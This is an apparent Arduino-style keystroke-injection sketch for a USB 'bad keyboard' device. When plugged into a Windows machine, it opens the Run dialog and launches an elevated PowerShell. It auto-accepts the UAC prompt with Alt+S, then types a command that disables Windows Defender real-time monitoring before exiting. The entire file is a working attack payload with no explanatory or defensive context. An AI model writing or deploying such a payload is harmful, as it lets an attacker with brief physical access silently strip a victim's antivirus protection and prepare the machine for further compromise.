#include <esKeyboard.h>

#define defaultDelay 5

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultDelay);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  
  delay(1000);

  delay(defaultDelay);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  typeKey(KEY_RETURN);

  delay(500);
  
  
  
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  
  /* ----- End-Script -----*/
  
  Keyboard.end();
}

void loop(){ /* ----- Unused-Loop -----*/ }
